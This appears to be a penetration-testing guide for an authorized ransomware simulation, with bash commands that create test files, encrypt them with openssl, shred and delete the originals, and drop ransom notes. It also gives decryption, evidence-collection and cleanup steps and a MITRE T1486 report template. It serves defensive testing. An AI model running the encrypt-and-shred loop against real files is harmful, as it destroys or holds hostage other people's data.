# Ransomware Simulation Guide

## Overview
Ransomware simulation demonstrates the ability to encrypt files and demand ransom,
proving that an attacker with the achieved access level could deploy actual ransomware.
This is done exclusively with test files in controlled environments.

## ⚠️ Safety First
- **NEVER encrypt production data** without explicit written authorization
- **ALWAYS save the decryption key** before encrypting anything
- **ALWAYS have a rollback plan** (backup, snapshot, key retention)
- Create your own test files — don't touch existing data

## Simulation Setup
```bash
# Create isolated test environment
TEST_DIR="/tmp/ransomware_sim_$(date +%s)"
mkdir -p "$TEST_DIR/documents" "$TEST_DIR/database" "$TEST_DIR/configs"

# Generate realistic test files
for i in $(seq 1 20); do
    echo "Confidential document $i - $(date) - $(head -c 500 /dev/urandom | base64)" \
        > "$TEST_DIR/documents/report_$i.docx"
done
dd if=/dev/urandom bs=1024 count=500 of="$TEST_DIR/database/customers.db" 2>/dev/null
echo "db_password=s3cret123" > "$TEST_DIR/configs/app.conf"

# Record baseline
find "$TEST_DIR" -type f -exec sha256sum {} \; > "$TEST_DIR/.baseline_hashes"
echo "Test environment: $TEST_DIR"
echo "Files created: $(find "$TEST_DIR" -type f | wc -l)"
```

## Encryption Phase
```bash
# Generate encryption key and save it
RANSOM_KEY=$(openssl rand -hex 32)
KEY_FILE="$TEST_DIR/.decryption_key"
echo "$RANSOM_KEY" > "$KEY_FILE"
echo "KEY SAVED TO: $KEY_FILE"

# Encrypt all files (mimics ransomware behavior)
find "$TEST_DIR" -type f ! -name ".decryption_key" ! -name ".baseline_hashes" \
    ! -name "README_RANSOM.txt" | while read -r file; do
    openssl enc -aes-256-cbc -salt -pbkdf2 -in "$file" -out "${file}.locked" -k "$RANSOM_KEY"
    shred -n 1 "$file"  # overwrite original
    rm "$file"
    echo "Encrypted: $file"
done

# Rename with ransomware extension
find "$TEST_DIR" -name "*.locked" | while read -r file; do
    mv "$file" "${file%.locked}.ENCRYPTED"
done

# Drop ransom note in each directory
find "$TEST_DIR" -type d | while read -r dir; do
    cat > "$dir/README_RANSOM.txt" << EOF
╔══════════════════════════════════════════════════════════╗
║            PENETRATION TEST - RANSOMWARE PROOF           ║
╠══════════════════════════════════════════════════════════╣
║ Your files have been encrypted with AES-256-CBC.         ║
║                                                          ║
║ This is a CONTROLLED SIMULATION during an authorized     ║
║ penetration test. No real data has been harmed.          ║
║                                                          ║
║ Tester: [NAME]                                           ║
║ Date: $(date)                              ║
║ Engagement: [ID]                                         ║
║                                                          ║
║ Decryption key is retained and will restore all files.   ║
╚══════════════════════════════════════════════════════════╝
EOF
done
```

## Evidence Collection
```bash
# Screenshot the encrypted directory
ls -la "$TEST_DIR/documents/"
file "$TEST_DIR/documents/"*  # show all files are "data" (encrypted)
cat "$TEST_DIR/documents/README_RANSOM.txt"

# Count encrypted files
echo "Encrypted files: $(find "$TEST_DIR" -name "*.ENCRYPTED" | wc -l)"
echo "Ransom notes dropped: $(find "$TEST_DIR" -name "README_RANSOM.txt" | wc -l)"
```

## Decryption / Rollback
```bash
# Read saved key
RANSOM_KEY=$(cat "$TEST_DIR/.decryption_key")

# Decrypt all files
find "$TEST_DIR" -name "*.ENCRYPTED" | while read -r file; do
    ORIG="${file%.ENCRYPTED}"
    openssl enc -aes-256-cbc -d -pbkdf2 -in "$file" -out "$ORIG" -k "$RANSOM_KEY"
    rm "$file"
    echo "Decrypted: $ORIG"
done

# Remove ransom notes
find "$TEST_DIR" -name "README_RANSOM.txt" -delete

# Verify restoration
echo "Restored files: $(find "$TEST_DIR" -type f ! -name ".*" | wc -l)"
cat "$TEST_DIR/documents/report_1.docx"  # verify readable
```

## Reporting Template
```
Finding: Ransomware Deployment Capability
Severity: Critical
MITRE: T1486 - Data Encrypted for Impact

Description: With [access method], an attacker could deploy ransomware
encrypting [X] files across [Y] directories. AES-256 encryption was
demonstrated on test files, proving full ransomware capability.

Impact: Complete data loss without decryption key. Estimated recovery
time without backups: [estimate]. Backup status: [verified/unverified].

Recommendation:
- Implement endpoint detection for mass file encryption patterns
- Maintain offline/immutable backups with regular restore testing
- Deploy file integrity monitoring on critical directories
- Implement application whitelisting to prevent unauthorized encryption tools
```

## Cleanup
```bash
# Remove entire test environment
rm -rf "$TEST_DIR"
echo "Ransomware simulation environment cleaned up"
```
